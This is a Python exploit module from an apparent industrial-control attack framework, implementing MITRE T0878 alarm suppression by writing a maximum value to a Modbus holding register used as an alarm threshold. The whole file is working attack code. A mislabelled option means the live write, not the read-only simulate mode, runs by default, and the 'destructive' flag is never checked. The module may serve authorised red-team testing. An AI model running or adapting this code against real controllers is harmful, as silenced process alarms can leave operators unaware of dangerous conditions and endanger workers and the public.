"""MITRE T0878 - Alarm Suppression via Modbus Threshold Write.

Adversaries may modify alarm thresholds or suppress alarm signals to prevent
operators from being notified of dangerous or anomalous conditions.
This module demonstrates T0878 by writing extreme threshold values to
Modbus holding registers used for alarm setpoints.

MITRE ATT&CK for ICS v19: T0878 (Alarm Suppression)
"""

import socket
import struct

from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":         "MITRE T0878 Alarm Suppression - Modbus Threshold Write",
        "description":  "Writes extreme values to Modbus holding registers used as "
                        "alarm thresholds (high/low setpoints), effectively disabling "
                        "alarms. For example: setting high-temp alarm threshold to 65535 "
                        "(max) means the alarm can never trigger. "
                        "Simulate mode reads current thresholds only.",
        "authors":      ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":   (
            "https://attack.mitre.org/techniques/T0878/",
        ),
        "devices":      ("Any Modbus-connected process controller with alarm thresholds"),
        "impact":       "HIGH",
        "exploit_type": "Alarm Suppression (Process Manipulation)",
        "source_poc":   "IXF native",
        "cve":          "N/A", "cvss": "N/A", "severity": "HIGH",
        "mitre_techniques": ["T0878", "T0838", "T0836"],
        "mitre_tactics":    ["Inhibit Response Function"],
        "destructive_description": (
            "Will write value=65535 to Modbus holding register {address} on "
            "{target}:{port} (alarm high threshold). "
            "This disables the high-limit alarm - operators will not be notified of "
            "dangerous process conditions until restored."
        ),
    }

    target   = OptIP("", "Target Modbus device IP")
    port     = OptPort(502, "Modbus TCP port")
    unit_id  = OptInteger(1, "Modbus unit ID")
    address  = OptInteger(100, "Alarm threshold register address (default 100)")
    suppress_value = OptInteger(65535, "Value to write for suppression (default 65535 = max)")
    timeout  = OptInteger(5, "Socket timeout")
    simulate = OptBool(False, "Simulate mode (default: True - read only)")
    destructive = OptBool(False, "Enable alarm suppression write (HIGH impact)")

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            pdu = struct.pack(">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x03, self.address, 1)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.send(pdu)
            resp = sock.recv(64)
            sock.close()
            return len(resp) >= 9 and resp[7] == 0x03
        except (ConnectionError, TimeoutError, OSError, struct.error):
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option first.")
            return

        if self.simulate:
            # Read current threshold value
            print_status(f"[T0878] Reading alarm threshold register {self.address} (simulate)…")
            try:
                pdu = struct.pack(">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x03, self.address, 3)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target, self.port))
                sock.send(pdu)
                resp = sock.recv(64)
                sock.close()
                if len(resp) >= 11 and resp[7] == 0x03:
                    vals = [struct.unpack(">H", resp[9+i*2:11+i*2])[0] for i in range(3)]
                    print_success(f"[T0878] Alarm threshold registers {self.address}-{self.address+2}: {vals}")
                    print_warning(f"[T0878] In destructive mode: would write {self.suppress_value} to suppress alarm.")
            except (ConnectionError, TimeoutError, OSError, struct.error) as exc:
                print_error(f"[T0878] Read error: {exc}")

            DestructiveGate.print_simulation(
                description=(
                    f"T0878: Would write {self.suppress_value} to alarm threshold register {self.address} on {self.target}:{self.port}. "
                    "This disables the alarm - operators cannot receive alerts."
                ),
                payload_hex=f"00 01 00 00 00 06 {self.unit_id:02X} 06 {self.address:04X} {self.suppress_value:04X}",
                mitre_techniques=["T0878", "T0838"],
            )
            return

        print_status(f"[T0878 LIVE] Writing alarm suppression to register {self.address}…")
        try:
            pdu = struct.pack(
                ">HHHBBHH", 0x0001, 0, 6, self.unit_id, 0x06, self.address, self.suppress_value
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.send(pdu)
            resp = sock.recv(32)
            sock.close()
            if resp and resp[7] == 0x06:
                print_success(f"[T0878] Alarm threshold register {self.address} set to {self.suppress_value}. Alarm suppressed.")
            else:
                print_error("[T0878] Unexpected response.")
        except (ConnectionError, TimeoutError, OSError, struct.error) as exc:
            print_error(f"[T0878] Error: {exc}")
